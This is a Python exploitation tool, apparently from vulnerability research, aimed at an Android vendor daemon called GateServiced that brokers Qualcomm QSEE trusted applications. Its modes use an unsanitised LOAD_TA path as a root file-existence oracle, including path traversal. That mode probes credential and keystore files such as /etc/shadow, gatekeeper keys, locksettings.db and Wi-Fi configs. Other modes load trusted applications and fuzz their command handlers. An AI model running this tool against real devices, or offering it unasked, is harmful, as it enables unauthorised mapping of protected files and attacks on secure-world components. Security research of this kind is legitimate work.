#!/usr/bin/env python3
"""
GateServiced Protocol Test & Exploitation Tool
================================================
Phase 2: Dynamic Validation of Phase 1 Static Analysis

Wire Protocol (from Phase 1 RE):
  Request:  [CMD_ID: 4 bytes LE] [PAYLOAD: 0-20476 bytes]
  Response: [DATA: variable]  (only sent on cmd_dispatch success)

Commands:
  0x00010003 = LOAD_TA    (payload = TA file path, max 128 bytes)
  0x00010004 = UNLOAD_TA  (no payload required)
  <other>    = EXEC_CMD   (forwarded to loaded TA via DMA → QSEE)

Usage:
  adb forward tcp:8341 tcp:8341
  python3 gate_protocol_test_v2.py conn
  python3 gate_protocol_test_v2.py discovery
  python3 gate_protocol_test_v2.py fuzz_exec
  python3 gate_protocol_test_v2.py oracle
  python3 gate_protocol_test_v2.py boundary
"""

import socket
import struct
import sys
import time

# ══════════════════════════════════════════════════════════════
#  CONFIG
# ══════════════════════════════════════════════════════════════

TARGET_IP   = "127.0.0.1"  # Use localhost with ADB Forward
TARGET_PORT = 8341
TIMEOUT     = 5

# Commands (From Phase 1 RE Report)
CMD_LOAD_TA   = 0x00010003
CMD_UNLOAD_TA = 0x00010004

# ══════════════════════════════════════════════════════════════
#  PROTOCOL LAYER
# ══════════════════════════════════════════════════════════════

def send_packet(cmd_id, payload=b"", timeout=None):
    """
    Connect → send [cmd_id LE32][payload] → recv response → close.
    Returns response bytes or None on error/timeout.
    """
    t = timeout or TIMEOUT
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(t)
        sock.connect((TARGET_IP, TARGET_PORT))

        header = struct.pack("<I", cmd_id)
        packet = header + payload

        print(f"[>] CMD: 0x{cmd_id:08X} | Payload: {len(payload)} bytes")
        sock.sendall(packet)

        response = sock.recv(4096)
        print(f"[<] Received: {len(response)} bytes")
        if response:
            print(f"    Raw : {response[:128].hex()}")
            try:
                ascii_text = response.decode('utf-8', errors='replace')
                print(f"    Text: {ascii_text}")
            except:
                pass
        sock.close()
        return response

    except socket.timeout:
        print(f"[!] Timeout ({t}s) — no response (cmd_dispatch returned error)")
        try: sock.close()
        except: pass
        return None
    except ConnectionRefusedError:
        print(f"[!] Connection refused — service not running on {TARGET_IP}:{TARGET_PORT}")
        return None
    except ConnectionResetError:
        print(f"[!!!] CONNECTION RESET — GateServiced CRASHED! Check tombstone!")
        return None
    except Exception as e:
        print(f"[!] Error: {e}")
        return None

# ══════════════════════════════════════════════════════════════
#  MODE: conn — Connectivity & Protocol Sanity Check
# ══════════════════════════════════════════════════════════════

def mode_connectivity():
    """
    Sends UNLOAD_TA (safe, idempotent). Validates:
    - TCP connection to port 8341
    - Wire format (LE32 cmd_id) is accepted
    - Expected response: "unload ta succeed"
    """
    print("=" * 60)
    print("  CONNECTIVITY & PROTOCOL VALIDATION")
    print("  Sending: CMD_UNLOAD_TA (0x00010004)")
    print("=" * 60)
    print()

    resp = send_packet(CMD_UNLOAD_TA)

    print()
    if resp and b"unload ta succeed" in resp:
        print("[OK] Protocol VALID — endianness correct, service responsive.")
        print("     Proceed to: python3 gate_protocol_test_v2.py discovery")
    elif resp:
        print(f"[??] Unexpected response: {resp!r}")
        print("     Protocol may work but response differs from expectation.")
    else:
        print("[FAIL] No response. Check:")
        print("  1. Is GateServiced running?  adb shell ps -A | grep -i gate")
        print("  2. Is port forwarded?        adb forward tcp:8341 tcp:8341")
        print("  3. Verify with netcat:       nc -zv 127.0.0.1 8341")

# ══════════════════════════════════════════════════════════════
#  MODE: discovery — TA Discovery via File Existence Oracle
# ══════════════════════════════════════════════════════════════

def mode_discovery():
    """
    Exploit the File Existence Oracle:
    - LOAD_TA reads the file as root, sends it to QSEE.
    - Response received  → File exists (QSEE accepted or rejected it).
    - Timeout            → File does NOT exist (get_file_size returned 0).
    - Connection reset   → Service CRASHED (potential memory corruption!).

    Interpretation:
      "load ta succeed"     → JACKPOT: Valid signed TA loaded into QSEE!
      Any other response    → File EXISTS but not a valid TA
      Timeout               → File NOT FOUND
      Connection reset      → CRASH — check `adb shell logcat | grep tombstone`
    """
    print("=" * 60)
    print("  TA DISCOVERY — File Existence Oracle")
    print("  Sending: CMD_LOAD_TA (0x00010003) with various paths")
    print("=" * 60)
    print()

    # Unload any previously loaded TA first
    print("[*] Pre-cleaning: UNLOAD_TA...")
    send_packet(CMD_UNLOAD_TA)
    time.sleep(0.3)
    print()

    # Qualcomm QSEE standard TA paths
    ta_paths = [
        # ── Standard Qualcomm firmware mount ──
        b"/vendor/firmware_mnt/image/cppf.mbn",
        b"/vendor/firmware_mnt/image/tzhdcp.mbn",
        b"/vendor/firmware_mnt/image/hdcp2p2.mbn",
        b"/vendor/firmware_mnt/image/sampleauth.mbn",
        b"/vendor/firmware_mnt/image/fidocrypto.mbn",
        b"/vendor/firmware_mnt/image/fidocfg.mbn",
        b"/vendor/firmware_mnt/image/qmiprivsys.mbn",
        b"/vendor/firmware_mnt/image/chamomile.mbn",
        b"/vendor/firmware_mnt/image/secotacl.mbn",
        b"/vendor/firmware_mnt/image/soter.mbn",
        b"/vendor/firmware_mnt/image/voiceprint.mbn",
        b"/vendor/firmware_mnt/image/tz_ccm.mbn",
        b"/vendor/firmware_mnt/image/tbase.mbn",
        b"/vendor/firmware_mnt/image/playready.mbn",
        b"/vendor/firmware_mnt/image/widevine.mbn",
        b"/vendor/firmware_mnt/image/isdbtmm.mbn",
        b"/vendor/firmware_mnt/image/gpqese.mbn",
        b"/vendor/firmware_mnt/image/storsec.mbn",
        b"/vendor/firmware_mnt/image/spdaemon.mbn",
        b"/vendor/firmware_mnt/image/kmsvc.mbn",
        b"/vendor/firmware_mnt/image/haventoken.mbn",
        b"/vendor/firmware_mnt/image/sec_img_auth.mbn",
        b"/vendor/firmware_mnt/image/smplap64.mbn",
        b"/vendor/firmware_mnt/image/smplap32.mbn",
        b"/vendor/firmware_mnt/image/macchiato.mbn",
        b"/vendor/firmware_mnt/image/securemm.mbn",
        b"/vendor/firmware_mnt/image/keymaster64.mbn",
        b"/vendor/firmware_mnt/image/gatekeeper.mbn",
        b"/vendor/firmware_mnt/image/qcom_eeeprom.mbn",

        # ── Alternative firmware locations ──
        b"/vendor/firmware/cppf.mbn",
        b"/vendor/firmware/widevine.mbn",
        b"/vendor/firmware/keymaster64.mbn",
        b"/firmware/image/cppf.mbn",
        b"/firmware/image/widevine.mbn",
        b"/firmware/image/keymaster64.mbn",

        # ── OEM custom ──
        b"/vendor/firmware/gate.mbn",
        b"/vendor/etc/gate/gate.mbn",
        b"/system/vendor/firmware/gate.mbn",

        # ── Control: known files that exist but are NOT TAs ──
        b"/system/bin/sh",
        b"/vendor/build.prop",

        # ── Control: path traversal ──
        b"../../../../etc/hosts",
        b"../../../system/build.prop",

        # ── Control: nonexistent file ──
        b"/does/not/exist.mbn",
    ]

    results = {"LOADED": [], "EXISTS": [], "NOT_FOUND": [], "CRASH": []}

    for path in ta_paths:
        payload = path + b"\x00"
        label = path.decode('utf-8', errors='replace')
        print(f"\n{'─' * 50}")
        print(f"[?] Probing: {label}")

        resp = send_packet(CMD_LOAD_TA, payload)

        if resp is None:
            results["NOT_FOUND"].append(label)
        elif len(resp) == 0:
            print(f"    *** EMPTY RESPONSE — possible crash ***")
            results["CRASH"].append(label)
        elif b"load ta succeed" in resp:
            print(f"    ★★★ JACKPOT — VALID TA LOADED! ★★★")
            results["LOADED"].append(label)
            # Unload for next probe
            time.sleep(0.2)
            send_packet(CMD_UNLOAD_TA)
        elif b"already loaded" in resp:
            print(f"    ★ TA already loaded from previous probe")
            results["LOADED"].append(label)
        else:
            # Got a response → file exists, but QSEE rejected it
            print(f"    → File EXISTS (QSEE rejected — not a valid signed TA)")
            results["EXISTS"].append(label)

        time.sleep(0.3)

    # ── Summary ──
    print(f"\n{'═' * 60}")
    print(f"  DISCOVERY RESULTS")
    print(f"{'═' * 60}")

    if results["LOADED"]:
        print(f"\n  ★★★ LOADABLE TAs (JACKPOT) ★★★")
        for p in results["LOADED"]:
            print(f"    → {p}")
        print(f"\n  NEXT: python3 gate_protocol_test_v2.py fuzz_exec")

    if results["EXISTS"]:
        print(f"\n  [+] Files that EXIST (Oracle confirmed):")
        for p in results["EXISTS"]:
            print(f"    ✓ {p}")

    if results["NOT_FOUND"]:
        print(f"\n  [-] Not found ({len(results['NOT_FOUND'])} paths):")
        for p in results["NOT_FOUND"][:5]:
            print(f"    ✗ {p}")
        if len(results["NOT_FOUND"]) > 5:
            print(f"    ... and {len(results['NOT_FOUND'])-5} more")

    if results["CRASH"]:
        print(f"\n  [!!!] CRASHES (check tombstone!):")
        for p in results["CRASH"]:
            print(f"    💥 {p}")

    return results

# ══════════════════════════════════════════════════════════════
#  MODE: fuzz_exec — TA Command Fuzzing ("Golden Path")
# ══════════════════════════════════════════════════════════════

def mode_fuzz_exec():
    """
    PREREQUISITE: A TA must be loaded (run 'discovery' first).

    QSEE TAs communicate via a command ID (first 4 bytes of the payload).
    GateServiced forwards any cmd_id != 0x10003/0x10004 to the loaded TA
    via DMA shared memory (run_exec_cmd_ta).

    DMA Request Layout:
      [0x00] = 0x55 (request magic)
      [0x01] = cmd_id (4 bytes)
      [0x05] = input_len (8 bytes)
      [0x0D] = payload data

    DMA Response Layout:
      [0x00] = 0xAA (response magic, set by TA)
      [0x01] = response length (8 bytes)
      [0x09] = response data
      → Response data IS sent back to TCP client!
    """
    print("=" * 60)
    print("  TA COMMAND FUZZING — The Golden Path")
    print("  Probing loaded TA via EXEC_CMD")
    print("=" * 60)
    print()

    # Sanity: check if TA is loaded
    print("[*] Pre-check: Sending EXEC with cmd_id=0x01...")
    resp = send_packet(0x00000001, b"\x00" * 16)
    if resp is None:
        print("\n[!] No response — TA may not be loaded.")
        print("    Run 'discovery' first to load a TA.")
        print("    Or check logcat for 0x300C (TA_NOT_LOADED)")
        return

    print()
    print("[+] TA is responding! Fuzzing command handlers...")
    print()

    # QSEE TA command IDs to probe.
    # Standard Qualcomm TA commands typically use small integers.
    # The cmd_id here is NOT the GateServiced cmd_id — it's what gets
    # written to DMA buf[1] and forwarded to the TA.
    fuzz_cmds = [
        # Small integers (common TA command handlers)
        (0x00000001, b"\x00" * 16, "cmd=0x01 (generic query)"),
        (0x00000002, b"\x00" * 16, "cmd=0x02"),
        (0x00000003, b"\x00" * 16, "cmd=0x03"),
        (0x00000004, b"\x00" * 16, "cmd=0x04"),
        (0x00000005, b"\x00" * 16, "cmd=0x05"),
        (0x0000000A, b"\x00" * 16, "cmd=0x0A"),
        (0x00000010, b"\x00" * 16, "cmd=0x10"),
        (0x00000020, b"\x00" * 16, "cmd=0x20"),
        (0x00000100, b"\x00" * 16, "cmd=0x100"),
        (0x00001000, b"\x00" * 16, "cmd=0x1000"),

        # Commands that MIGHT overlap with internal routing
        (0x00010001, b"\x00" * 16, "cmd=0x10001 (near LOAD/UNLOAD range)"),
        (0x00010002, b"\x00" * 16, "cmd=0x10002"),
        (0x00010005, b"\x00" * 16, "cmd=0x10005"),

        # Boundary values
        (0x00000000, b"\x00" * 16, "cmd=0x00 (zero)"),
        (0xFFFFFFFF, b"\x00" * 16, "cmd=0xFFFFFFFF (max)"),
        (0xDEADBEEF, b"\x00" * 16, "cmd=0xDEADBEEF"),

        # With payload variations
        (0x00000001, b"", "cmd=0x01 (empty payload)"),
        (0x00000001, b"\x41" * 256, "cmd=0x01 (256B 'A' payload)"),
        (0x00000001, b"\x41" * 4096, "cmd=0x01 (4KB payload)"),
    ]

    responsive = []
    for cmd_id, payload, desc in fuzz_cmds:
        print(f"\n{'─' * 50}")
        print(f"[?] {desc}")
        resp = send_packet(cmd_id, payload)

        if resp is not None and len(resp) > 0:
            responsive.append((cmd_id, desc, resp))
            if b"succeed" in resp:
                print(f"    ★ Command ACCEPTED with 'succeed' response!")
            elif b"fail" in resp.lower():
                print(f"    → Command recognized but failed")
            else:
                print(f"    → Got {len(resp)} bytes back from TA")
        elif resp is not None and len(resp) == 0:
            print(f"    *** CRASH? Empty response ***")

        time.sleep(0.3)

    # Summary
    print(f"\n{'═' * 60}")
    print(f"  EXEC FUZZING RESULTS")
    print(f"{'═' * 60}")

    if responsive:
        print(f"\n  [+] Commands that got a response ({len(responsive)}):")
        for cmd_id, desc, resp in responsive:
            resp_preview = resp[:40].hex()
            print(f"    0x{cmd_id:08X} → {resp_preview}...")
        print(f"\n  NEXT STEP: Deep-fuzz the responsive commands with")
        print(f"  varied payload structures to identify TA functionality.")
    else:
        print(f"\n  [-] No commands got a response from the TA.")
        print(f"      The TA may be very restricted or command format differs.")
        print(f"      Check logcat for 0x300E (RESP_INVALID) or crash signatures.")

# ══════════════════════════════════════════════════════════════
#  MODE: oracle — File Existence Oracle (Blind Filesystem Map)
# ══════════════════════════════════════════════════════════════

def mode_oracle():
    """
    Use the LOAD_TA path traversal to map the filesystem as root.
    Probe sensitive paths to confirm the oracle works.

    Principle:
      Response received  → File EXISTS (load succeeded or QSEE rejected)
      Timeout            → File NOT FOUND (get_file_size returned 0)
    """
    print("=" * 60)
    print("  FILE EXISTENCE ORACLE — Blind Filesystem Mapping")
    print("  Exploiting: LOAD_TA path traversal (no sanitization)")
    print("=" * 60)
    print()

    # Unload first
    send_packet(CMD_UNLOAD_TA)
    time.sleep(0.3)

    sensitive_paths = [
        # ── Identity ──
        b"/etc/passwd",
        b"/etc/hosts",
        b"/etc/shadow",

        # ── Kernel / System ──
        b"/proc/version",
        b"/proc/cmdline",
        b"/sys/kernel/security/lsm",
        b"/dev/kmsg",

        # ── Android Keystore / Credentials ──
        b"/data/misc/keystore/user_0/.masterkey",
        b"/data/misc/wifi/WifiConfigStore.xml",
        b"/data/system/locksettings.db",
        b"/data/system/password.key",
        b"/data/system/gesture.key",
        b"/data/system/gatekeeper.password.key",
        b"/data/system/gatekeeper.pattern.key",

        # ── SELinux ──
        b"/sys/fs/selinux/enforce",
        b"/sys/fs/selinux/policy",
        b"/sepolicy",

        # ── Boot / Recovery ──
        b"/dev/block/bootdevice/by-name/boot",
        b"/dev/block/bootdevice/by-name/recovery",
        b"/dev/block/bootdevice/by-name/system",
        b"/dev/block/bootdevice/by-name/userdata",

        # ── Magisk / Root indicators ──
        b"/data/adb/magisk",
        b"/sbin/su",
        b"/system/xbin/su",
        b"/system/app/Superuser.apk",

        # ── App data (existence check) ──
        b"/data/data/com.android.settings/databases/",
        b"/data/data/com.rokid.glass.launcher/",
        b"/data/data/com.rokid.camera/",

        # ── Property files ──
        b"/system/build.prop",
        b"/vendor/build.prop",
        b"/default.prop",

        # ── Writable locations (for fake TA attack) ──
        b"/data/local/tmp/",
        b"/data/local/tmp/test",
        b"/sdcard/",
    ]

    exists = []
    not_found = []
    crashes = []

    for path in sensitive_paths:
        # Use traversal prefix for relative interpretation
        if path.startswith(b"/"):
            # Absolute path — send as-is
            payload = path + b"\x00"
        else:
            payload = path + b"\x00"

        if len(payload) > 128:
            print(f"[!] Path too long, skipping: {path.decode()}")
            continue

        label = path.decode('utf-8', errors='replace')
        resp = send_packet(CMD_LOAD_TA, payload)

        if resp is None:
            not_found.append(label)
        elif len(resp) == 0:
            crashes.append(label)
            print(f"    *** CRASH on path: {label} ***")
        elif b"load ta succeed" in resp:
            exists.append((label, "VALID_TA"))
            print(f"    ★ Valid TA!")
            send_packet(CMD_UNLOAD_TA)
            time.sleep(0.2)
        elif b"already loaded" in resp:
            exists.append((label, "ALREADY"))
        else:
            exists.append((label, "EXISTS_NOT_TA"))
            print(f"    ✓ File EXISTS (not a valid TA)")

        time.sleep(0.2)

    # Summary
    print(f"\n{'═' * 60}")
    print(f"  ORACLE RESULTS — Root Filesystem Map")
    print(f"{'═' * 60}")

    if exists:
        print(f"\n  [+] Files confirmed to EXIST ({len(exists)}):")
        for path, status in exists:
            tag = "★ TA" if status == "VALID_TA" else "✓"
            print(f"    {tag}  {path}")

    if not_found:
        print(f"\n  [-] Files NOT FOUND ({len(not_found)}):")
        for path in not_found:
            print(f"    ✗  {path}")

    if crashes:
        print(f"\n  [!!!] CRASHES ({len(crashes)}):")
        for path in crashes:
            print(f"    💥  {path}")

    return {"exists": exists, "not_found": not_found, "crashes": crashes}

# ══════════════════════════════════════════════════════════════
#  MODE: boundary — Boundary Condition Testing
# ══════════════════════════════════════════════════════════════

def mode_boundary():
    """
    Validate Phase 1 boundary findings:
    - ta_name length check at cmd_dispatch 0x26CC (128 byte limit)
    - Max frame size (0x5000 = 20480 bytes)
    - Edge cases
    """
    print("=" * 60)
    print("  BOUNDARY CONDITION VALIDATION")
    print("=" * 60)
    print()

    tests = [
        ("ta_name = 127 bytes (should pass length check)",
         CMD_LOAD_TA, b"/" + b"A" * 126),

        ("ta_name = 128 bytes (should fail → 0x3002 INVALID_PARAM)",
         CMD_LOAD_TA, b"/" + b"A" * 127),

        ("ta_name = 200 bytes (definitely too long)",
         CMD_LOAD_TA, b"/" + b"A" * 199),

        ("LOAD_TA with empty payload (→ 0x300B INVALID_APP)",
         CMD_LOAD_TA, b""),

        ("LOAD_TA with just null byte",
         CMD_LOAD_TA, b"\x00"),

        ("EXEC_CMD with no TA loaded (→ 0x300C TA_NOT_LOADED)",
         0x00000001, b"\x00" * 16),

        ("Max frame: 20480 bytes",
         0xDEADBEEF, b"\x00" * (0x5000 - 4)),
    ]

    for desc, cmd_id, payload in tests:
        print(f"\n{'─' * 50}")
        print(f"[?] {desc}")
        resp = send_packet(cmd_id, payload)
        if resp:
            print(f"    → Got response: {resp[:64]!r}")
        else:
            print(f"    → Timeout/Error (cmd_dispatch returned non-zero)")
        time.sleep(0.3)

# ══════════════════════════════════════════════════════════════
#  MAIN
# ══════════════════════════════════════════════════════════════

MODES = {
    "conn":      ("Connectivity & protocol sanity check",   mode_connectivity),
    "discovery": ("TA discovery via LOAD_TA oracle",        mode_discovery),
    "fuzz_exec": ("TA command fuzzing (Golden Path)",       mode_fuzz_exec),
    "oracle":    ("File existence oracle (filesystem map)", mode_oracle),
    "boundary":  ("Boundary condition validation",          mode_boundary),
}

def print_usage():
    print(f"""
GateServiced Protocol Test & Exploitation Tool
═══════════════════════════════════════════════

Usage: python3 gate_protocol_test_v2.py [--ip=IP] <mode>

Modes:""")
    for name, (desc, _) in MODES.items():
        print(f"  {name:<12} {desc}")
    print(f"""
Recommended execution order:
  1. conn       — Validate connectivity & endianness
  2. discovery  — Scan for loadable TAs (exploit file oracle)
  3. oracle     — Map sensitive files via path traversal
  4. boundary   — Validate Phase 1 boundary analysis
  5. fuzz_exec  — Fuzz TA commands (requires loaded TA)

Prerequisites:
  adb forward tcp:8341 tcp:8341

Monitoring (separate terminals):
  adb shell logcat -v color -s "GateServiced" "GATE CA" "QSEECOMAPI:v"
  adb shell logcat -v color | grep -E "diefd|tombstone|SIGSEGV|GateServiced"
""")

if __name__ == "__main__":
    # Parse args
    args = sys.argv[1:]
    mode_name = None

    for arg in args:
        if arg.startswith("--ip="):
            TARGET_IP = arg.split("=", 1)[1]
        elif arg.startswith("--timeout="):
            TIMEOUT = int(arg.split("=", 1)[1])
        elif arg in MODES:
            mode_name = arg
        elif arg == "--help" or arg == "-h":
            print_usage()
            sys.exit(0)
        else:
            print(f"[!] Unknown argument: {arg}")
            print_usage()
            sys.exit(1)

    if not mode_name:
        print_usage()
        sys.exit(1)

    print(f"\n{'═' * 60}")
    print(f"  GateServiced Phase 2 — {MODES[mode_name][0]}")
    print(f"  Target: {TARGET_IP}:{TARGET_PORT}")
    print(f"{'═' * 60}\n")

    MODES[mode_name][1]()

    print(f"\n{'═' * 60}")
    print(f"  Done. Check logcat output for correlating device-side logs.")
    print(f"{'═' * 60}\n")
